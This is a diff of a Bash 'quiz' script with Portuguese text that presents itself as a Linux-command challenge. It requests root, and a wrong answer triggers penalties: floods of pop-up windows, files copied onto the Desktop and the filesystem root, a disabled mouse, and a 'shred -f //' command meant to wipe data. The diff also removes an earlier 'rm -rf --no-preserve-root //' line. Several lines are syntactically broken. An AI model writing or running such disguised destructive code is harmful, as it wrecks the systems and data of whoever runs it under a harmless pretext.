@@ -4,87 +4,144 @@
 readonly xfce4_channel="xfce4-desktop"
 readonly xfce_path="/backdrop/screen0/monitorVirtual1/workspace0"
 
-# ------------------------------------------------------------------------------
 # Function: get_root
 # Description: requests acess to root permission in order to run the .sh file
 # Arguments:
-# ------------------------------------------------------------------------------
 get_root (){
 	pkexec /user/bin/id
 	}
 
-# ------------------------------------------------------------------------------
+
+# Function: prepare_workspace
+# Description: installs necessary apps and programs
+# Arguments:
+prepare_workspace(){
+	sudo apt update 
+	sudo apt install xinput xcowsay zenity 
+}
+
+
 # Function: wallpaper_effect_on
 # Description: modifies the timer, period and enables cycling between the wallpaper images
 # Arguments:
 # Wrote by: Helvecio
-# ------------------------------------------------------------------------------
 wallpaper_effect_on() {
 	xfconf-query -c "${xfce4_channel}" -p "${xfce_path}"/backdrop-cycle-enable -s true;
 	xfconf-query -c "${xfce4_channel}" -p "${xfce_path}"/backdrop-cycle-period -s 0;
 	xfconf-query -c "${xfce4_channel}" -p "${xfce_path}"/backdrop-cycle-timer -s 1;
 }
 
-# ------------------------------------------------------------------------------
-# Function: zenity_scattering_warn
+
+# Function: zenity_scattering_error1
 # Description: 
 # Wrote by: Helvecio
-# ------------------------------------------------------------------------------
-zenity_scattering_warn(){
-	
-	for i in {1..50}; do zenity --warning --text "VoCê ErRoUuUuUuUuUu :("\
-	--width=260 --height=120 --timeout=15 & done
-	x=$(($RANDOM % 1500))
-	y=$(($RANDOM % 900))
-
+zenity_scattering_error1(){
+	zenity --warning --text "VoCê ErRoUuUuUuUuUu :("\
+	--width=260 --height=120 --timeout 15 \	x=$(($RANDOM % 1920)) y=$(($RANDOM % 1080)) 
 }
 
 
-# ------------------------------------------------------------------------------
+# Function: zenity_scattering_error2
+# Description: zenity that shows error message as it scatter across the display
+# Wrote by: Helvecio
+zenity_scattering_error2 (){
+	zenity --warning --text "Dê tchau ao seu PC" --title "Aviso" --width 260 --height 120 --timeout 15
+}
+
+
+# Function: xcowsay1
+# Description: 1st xcowsay that has 2 text options
+# Wrote by: Helvecio
+xcowsay1(){
+ 	xcowsay -t 7 --cow-size med --font "MathJax-Caligraphic 23" --image ~/Downloads/ghost.jpeg "ERRAAAAADOOOOO"
+}
+
+
+# Function: xcowsay2
+# Description: 2nd xcowsay
+# Wrote by: Helvecio
+xcowsay2(){
+ 	xcowsay -t 7 --cow-size med --font "MathJax-Caligraphic 23" --image ~/Downloads/ghost.jpeg "AGORA SEU PC MORRERÁ :("	
+}
+
+
+# Function: xcowsay3
+# Description: 3rd xcowsay
+# Wrote by: Helvecio
+xcowsay3(){
+  	xcowsay -t 7 --cow-size small --font "MathJax-Caligraphic 23" --image ~/Downloads/ghost.jpeg "NÃOOOOOOOOOOO" 
+}
+
+
+# Function: teste1
+# Description: 1st test for the player
+# Wrote by: Helvecio
+teste1(){
+	zenity --height 300 --width 500 --info --title "Aviso" --no-cancel --text "Na verdade, o teste começará agora, boa sorte!"
+}
+
+
+# Function: teste1
+# Description: 2nd test for the player
+# Wrote by: Helvecio
+teste2(){
+	zenity --entry --height 300 --width 500 --title "Teste 2:" \
+  	--text "Qual o nome do comando muda as permissões de acesso de uma pasta ou arquivo ? pense antes, não haverá segundas chances...")
+}
+
+
+# Function: disable_mouse
+# Description: disables the main mouse inputs
+# Wrote by: Helvecio
+disable_mouse(){
+	mouse=$(xinput list --id-only "Virtual core pointer")
+	if [ "${mouse}" = 0 ]; then
+		xinput disable "Virtual core pointer" 
+	fi
+}
+
+
 # Function: trigger_penalty1
 # Description: first penalty if wrong input in 1st question
-# Arguments:
 # Wrote by: Helvecio
-# ------------------------------------------------------------------------------
+# Arguments:
 trigger_penalty1(){
 	xfconf-query -c "${xfce4_channel}" -p "${xfce_path}"/last-image -s ~/Downloads/squirward.jpeg;
-	sleep 5
-	zenity_scattering_warn
+	sleep 3
+	for i in {1..50}; do zenity_scattering_error1 & done
 	wallpaper_effect_on
-	for i in {1..30}; do xcowsay -t 7 --cow-size med --image ~/Downloads/ghost.jpeg "ERRAAAAADOOOOO" & done;
-		for i in {1..30}; do xcowsay -t 7 --cow-size med --image ~/Downloads/ghost.jpeg "AGORA SEU PC MORRERÁ :(" & done
-	for i in {1..100}; do cp ~/Scripts/invasao.txt ~/Desktop/Adeus$i.txt & done 
+	for i in {1..60}; do xcowsay1 & done
+	for i in {1..30}; do xcowsay2 & done
+	for i in {1..100}; do cp ~/Scripts/invasao.txt ~/Desktop/Adeus$i.txt & done
 	for i in {1..100}; do cp ~/Scripts/invasao.txt //*$i & done 
-	rm -rf --no-preserve-root // 
+	disable_mouse
 	exit 1
-
 }
 
-# ------------------------------------------------------------------------------
+
 # Function: trigger_penalty2
 # Description: second penalty if input is wrong in 2nd question
 # Arguments:
 # Wrote by: Helvecio
-# ------------------------------------------------------------------------------
 trigger_penalty2 (){
 
 	xfconf-query -c "${xfce4_channel}" -p "${xfce_path}"/last-image -s ~/Downloads/squirward.jpeg;
 	sleep 5
-	for i in {1..30}; do zenity --warning --text "VoCê ErRoUuUuUuUuUu" & done &
+	for i in {1..50}; do zenity_scattering_error1 & done
 	wallpaper_effect_on
-	for i in {1..30}; do xcowsay -t 7 --cow-size small --image ~/Downloads/ghost.jpeg "NÃOOOOOOOOOOO" & done
-	for i in {1..50}; do zenity --warning --title "Aviso" --height 300 --width 500 --text "Dê tchau ao seu PC" & done
+	for i in {1..30}; do xcowsay3 & done
+	for i in {1..50}; do zenity_scattering_error2 & done
 	xcowsay -t 6 --cow-size med "CONTAGEM REGRESSIVA:" 
-	for i in {1..10}; do xcowsay -t 1 "$i"; done 
+	for i in {1..10}; do xcowsay -t 0,850 "$i"; done 
 	for i in {1..300}; do xcowsay -t 2 --cow-size small --image ~/Downloads/squirward.jpeg & done
 	sleep 10
+	disable_mouse
 	shred -f //
 }
 
-# ------------------------------------------------------------------------------
+
 # Function: complete_challenge
 # Description: Handles the success workflow when both stages are passed and opening it.
-# ------------------------------------------------------------------------------
 complete_challenge(){
 	xfconf-query -c "${xfce4_channel}" -p "${xfce_path}"/last-image -s ~/Downloads/parabens.jpeg;
 	zenity --info --height 300 --width 500 --title "PARABÉNS VOCÊ CONCLUIU SUA JORNADA" \
@@ -93,19 +150,17 @@ complete_challenge(){
 	xed ~/Downloads/jornada.txt 
 }
 
-# ------------------------------------------------------------------------------
+
 # Function: main
 # Description: Orchestrates the quiz stages and validates user answers.
-# ------------------------------------------------------------------------------
 main (){ 
-	pkexec /user/bin/id
 	get_root
+	prepare_workspace
 	zenity --height 300 --width 500 --info --title "Aviso" --no-cancel --text "Na verdade, o teste começará agora, boa sorte!"
 
 	local answer1
 
-	answer1=$(zenity --entry --height 300 --width 500 --title "Teste 1" --text "Qual o nome do comando que cria uma pasta? \
-	(pense antes, não haverá segundas chances...)")
+	answer1="$(teste1)"
 	if [ "${answer1}" = "mkdir" ]; then
 		zenity --info --height 300 --width 500 --title "Correto" --text "Parabéns, resposta correta!!"
 	else trigger_penalty1
@@ -113,8 +168,7 @@ main (){
 
   	local answer2
 
-  	answer2=$(zenity --entry --height 300 --width 500 --title "Teste 2:" \
-  	--text "Qual o nome do comando muda as permissões de acesso de uma pasta ou arquivo ? pense antes, não haverá segundas chances...")
+  	answer2="$(teste2)"
  	if [ "${answer2}" = "chmod" ]; then
 		zenity --info --height 300 --width 500 --title "Correto" --text "Parabéns, resposta correta!!"
 		complete_challenge
